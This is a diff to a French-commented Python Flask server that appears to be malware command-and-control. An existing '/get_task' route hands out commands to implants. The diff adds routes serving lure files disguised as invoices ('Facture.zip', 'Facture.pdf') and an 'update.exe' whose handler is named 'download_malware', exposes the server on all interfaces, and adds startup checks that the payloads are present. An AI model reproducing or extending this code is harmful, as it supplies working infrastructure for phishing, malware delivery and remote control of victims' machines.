@@ -1,7 +1,8 @@
 import logging
 import threading
 import time
-from flask import Flask, request
+import os
+from flask import Flask, request, send_from_directory
 
 # 1. Configuration pour faire taire les logs Flask (le bruit de fond)
 log = logging.getLogger('werkzeug')
@@ -13,6 +14,31 @@ app = Flask(__name__)
 # "IDLE" signifie "Rien à faire, dors"
 command_to_send = "IDLE"
 
+@app.route('/Facture.zip', methods=['GET'])
+def download_zip():
+    # Sert le fichier ZIP situé dans le dossier courant
+    try:
+        return send_from_directory(os.getcwd(), 'Facture.zip', as_attachment=True)
+    except FileNotFoundError:
+        return "File not found", 404
+
+@app.route('/update.exe', methods=['GET'])
+def download_malware():
+    # Envoie le fichier update.exe situé dans le dossier courant
+    try:
+        return send_from_directory(os.getcwd(), 'update.exe', as_attachment=True)
+    except FileNotFoundError:
+        return "File not found", 404
+
+@app.route('/facture.pdf', methods=['GET'])
+def download_pdf():
+    # Envoie le fichier Facture.pdf (Attention aux majuscules/minuscules !)
+    # Si ton fichier sur le disque s'appelle "Facture.pdf", assure-toi que le nom ici correspond
+    try:
+        return send_from_directory(os.getcwd(), 'Facture.pdf', as_attachment=True)
+    except FileNotFoundError:
+        return "File not found", 404
+    
 @app.route('/get_task', methods=['GET'])
 def get_task():
     global command_to_send
@@ -61,9 +87,14 @@ def run_server():
     # Lancement du serveur (port 80 ou 8000 selon tes droits)
     # Si tu es root : port=80
     # Si tu es user : port=8000
-    app.run(host='0.0.0.0', port=80)
+    app.run(host='0.0.0.0', port=8000)
 
 if __name__ == '__main__':
+    # Vérification que les fichiers sont bien là avant de lancer
+    if not os.path.exists("update.exe"):
+        print("[!] ATTENTION : 'update.exe' est introuvable dans ce dossier !")
+    if not os.path.exists("Facture.pdf"):
+        print("[!] ATTENTION : 'Facture.pdf' est introuvable dans ce dossier !")
     # On lance l'interface clavier dans un processus parallèle (Thread)
     t = threading.Thread(target=console_input)
     t.daemon = True # Le thread mourra quand on fermera le script
